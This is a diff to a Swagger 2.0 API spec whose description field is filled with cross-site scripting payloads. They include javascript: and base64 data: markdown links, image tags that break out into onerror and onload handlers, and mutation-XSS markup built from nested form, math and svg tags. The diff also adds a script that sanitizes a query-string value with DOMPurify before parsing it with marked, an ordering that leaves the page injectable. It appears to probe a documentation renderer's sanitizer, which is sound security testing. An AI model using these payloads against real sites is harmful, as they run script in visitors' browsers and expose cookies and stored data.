@@ -2,7 +2,27 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    This is a test :)
+    This is a test :) [Link text Here](https://link-url-here.org)
+    [Basic](javascript:alert('Basic'))
+[Local Storage](javascript:alert(JSON.stringify(localStorage)))
+[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
+[URL](javascript://www.google.com%0Aalert('URL'))
+[In Quotes]('javascript:alert("InQuotes")')
+[a](j a v a s c r i p t:prompt(document.cookie))
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[a](javascript:window.onerror=alert;throw%201)
+![Uh oh...]("onerror="alert('XSS'))
+![Uh oh...](https://www.example.com/image.png"onload="alert('XSS'))
+![Escape SRC - onload](https://www.example.com/image.png"onload="alert('ImageOnLoad'))
+![Escape SRC - onerror]("onerror="alert('ImageOnError'))
+<script src="https://cdn.jsdelivr.net/npm/dompurify@2.3.6/dist/purify.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/marked@4.0.14/lib/marked.umd.min.js"></script>
+<script>
+const qs = new URLSearchParams(location.search);
+if (qs.get("content")?.length > 0) {
+    document.body.innerHTML = marked.parse(DOMPurify.sanitize(qs.get("content")));
+}
+</script>
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
     <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
     <iframe></iframe>
